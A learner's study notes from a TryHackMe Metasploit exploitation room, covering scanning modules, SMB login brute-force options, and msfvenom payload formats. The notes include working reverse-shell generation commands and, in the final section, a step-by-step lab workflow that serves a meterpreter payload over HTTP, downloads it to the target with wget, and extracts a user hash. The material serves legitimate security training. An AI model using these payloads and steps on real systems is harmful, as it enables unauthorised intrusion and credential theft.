## Day 29
### [**Streak**](https://tryhackme.com/Tushig3531/streak)
---
**Room Completed**
[**Metasploit: Exploitation**](https://tryhackme.com/room/metasploitexploitation)
---
### Port scanning
- **Concurrency** — Number of targets scanned simultaneously.  
- **Ports** — Port range to be scanned. Nmap scans the 1,000 most common ports by default; Metasploit can scan ports 1–10,000.  
- **Threads** — Number of threads used at once. More threads usually result in faster scans.

You can run Nmap scans directly from `msfconsole`.

---

### UDP service identification
The `scanner/discovery/udp_sweep` module can quickly identify services running over UDP (User Datagram Protocol).

---

### SMB scans
Useful modules for enterprise networks include `smb_enumshares` and `smb_version`.

Example module options output (auxiliary/scanner/smb/smb_login):
```nginx
msf6 auxiliary(scanner/smb/smb_login) > options
```
```nginx
Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting    Required  Description
   ----               ---------------    --------  -----------
   ABORT_ON_LOCKOUT   false              yes       Abort the run when an accoun
                                                   t lockout is detected
   ANONYMOUS_LOGIN    false              yes       Attempt to login with a blan
                                                   k username and password
   BLANK_PASSWORDS    false              no        Try blank passwords for all
                                                   users
   BRUTEFORCE_SPEED   5                  yes       How fast to bruteforce, from
                                                    0 to 5
   CreateSession      false              no        Create a new session for eve
                                                   ry successful login
   DB_ALL_CREDS       false              no        Try each user/password coupl
                                                   e stored in the current data
                                                   base
   DB_ALL_PASS        false              no        Add all passwords in the cur
                                                   rent database to the list
   DB_ALL_USERS       false              no        Add all users in the current
                                                    database to the list
   DB_SKIP_EXISTING   none               no        Skip existing credentials st
                                                   ored in the current database
                                                    (Accepted: none, user, user
                                                   &realm)
   DETECT_ANY_AUTH    false              no        Enable detection of systems
                                                   accepting any authentication
   DETECT_ANY_DOMAIN  false              no        Detect if domain is required
                                                    for the specified user
   PASS_FILE          /root/Desktop/pas  no        File containing passwords, o
                      s.txt                        ne per line
   PRESERVE_DOMAINS   true               no        Respect a username that cont
                                                   ains a domain name.
   Proxies                               no        A proxy chain of format type
                                                   :host:port[,type:host:port][
                                                   ...]
   RECORD_GUEST       false              no        Record guest-privileged rand
                                                   om logins to the database
   RHOSTS             10.201.22.16       yes       The target host(s), see http
                                                   s://docs.metasploit.com/docs
                                                   /using-metasploit/basics/usi
                                                   ng-metasploit.html
   RPORT              445                yes       The SMB service port (TCP)
   SMBDomain          .                  no        The Windows domain to use fo
                                                   r authentication
   SMBPass                               no        The password for the specifi
                                                   ed username
   SMBUser            penny              no        The username to authenticate
                                                    as
   STOP_ON_SUCCESS    false              yes       Stop guessing when a credent
                                                   ial works for a host
   THREADS            1                  yes       The number of concurrent thr
                                                   eads (max one per host)
   USERPASS_FILE                         no        File containing users and pa
                                                   sswords separated by space,
                                                   one pair per line
   USER_AS_PASS       false              no        Try the username as the pass
                                                   word for all users
   USER_FILE                             no        File containing usernames, o
                                                   ne per line
   VERBOSE            true               yes       Whether to print output for
                                                   all attempts


View the full module info with the info, or info -d command.
```
Use `info` or `info -d` for full module details.
---

### Common services and what to look for
- **HTTP** — Web apps that may have vulnerabilities like SQL injection or Remote Code Execution (RCE).  
- **FTP** — May allow anonymous login and expose interesting files.  
- **SMB** — Can be vulnerable to exploits (e.g., MS17-010) or misconfigurations.  
- **SSH** — Might have weak or default credentials.  
- **RDP** — Could allow desktop access if credentials are weak or an RDP vulnerability exists.

“Low-hanging fruit” refers to easily identifiable and exploitable vulnerabilities that can let an attacker gain initial access or escalate privileges quickly.

---

### Metasploit workflow notes
- Use the `info` command on any module to learn how to use it.  
- `show payloads` lists payloads compatible with a selected module.

**MSFvenom vs MSFconsole**
- **msfvenom** is a payload generation/encoding tool.  
- **msfconsole** is the interactive command-line interface for the Metasploit Framework.

`msfvenom` can create payloads in many formats. Example supported output formats include:
Executable formats:
asp, aspx, aspx-exe, axis2, dll, elf, exe, exe-service, hta-psh, jar, jsp, macho, msi, psh, python-reflection, vba, vbs, war, ...

Transform formats:
base32, base64, bash, c, csharp, go, hex, java, js_be, masm, perl, powershell, py, raw, rb, rust, sh, vbscript, zig, ...


Based on the taget system' configuration (operatin system, install webserver, installed interpreted, etc.), msfvenom can be used to create payloads in almost all formats.

Once we have the shell.elf file on our target machine, use the chmod+x shell.elf command to accord executable permissions. Once done, we can run this file by typing ./shell.elf on the target machine command line

```text
Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

**Basically, when venom creates payload file and once it enters the computer system, it gives the that specific access to the host**

I was given an IP address and needed to retrieve a user hash via Metasploit. My workflow was:
- fist I logged in to the user account
- then I created on my main machine
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.201.10.134 LPORT=4444 -f elf > rev.elf
```
- Then I made the code executable
```bash
chmod 777 rev.elf
```
- Then I hosted through python
```python
python3 -m http.server 9000
```
- Then I downloaded that file on my target machine using
```bash
wget http://10.201.10.134:9000/rev.elf
```
- On the target machine, I made the code executable
```bash
chmod 777 rev.elf
```
- Then I opened new terminal and created handler on msfconsole
- Then I set the LHOST and LPORT of the rev.elf
- After that I run the code on the target machine
- Eventually, I got into the system, and found the hash through meterpreter
